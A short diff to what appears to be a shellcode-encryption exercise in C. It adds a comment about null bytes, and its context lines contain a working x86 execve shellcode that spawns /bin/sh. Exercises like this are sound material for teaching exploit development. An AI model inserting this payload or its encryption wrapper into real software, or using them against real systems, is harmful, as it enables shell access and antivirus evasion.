@@ -73,6 +73,7 @@ int encrypt(unsigned char *shellcode, int shellcode_len,
 int main (int argc, char **argv)
 {
   // Change the shellcode for your purposes. Below is a stack-based execve shellcode from earlier exercises.
+  // Be careful with null bytes, they may terminate your shellcode early!
   unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
   // Do not change below this line!!
   unsigned char key[32],ciphertext[1024+EVP_MAX_BLOCK_LENGTH],tag[16];
